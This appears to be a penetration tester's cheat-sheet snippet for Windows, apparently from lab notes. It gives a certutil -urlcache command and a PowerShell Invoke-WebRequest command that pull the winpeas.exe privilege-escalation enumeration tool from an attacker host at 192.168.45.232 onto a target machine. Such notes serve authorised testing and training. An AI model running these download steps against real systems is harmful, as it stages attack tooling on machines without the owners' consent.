# Winodws
## cmd.exe
```
certutil.exe -f -urlcache http://192.168.45.232:8000/winpeas.exe c:\windows\temp\winpeeas.exe
```

## Powershell
```
Invoke-WebRequest http://192.168.45.232:8000/winpeas.exe -OutFile winpeas.exe
```